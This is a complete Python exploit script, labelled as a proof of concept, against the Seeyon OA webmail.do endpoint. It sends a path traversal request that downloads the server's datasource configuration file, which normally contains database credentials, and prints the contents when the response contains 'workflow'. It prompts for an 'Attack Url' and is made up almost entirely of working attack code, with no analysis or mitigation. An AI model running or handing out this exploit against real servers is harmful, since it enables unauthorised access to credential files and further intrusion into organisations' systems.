import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    banner = """
         __  __     ______     __  __     ______     __  __     ______     __  __     ______    
        /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   
        \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  
         \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\ 
          \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/ 
                                                                                             
"""
    print(banner)

def POC_1(target_url):
    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print("\033[32m[o] 目标{}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 文件请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)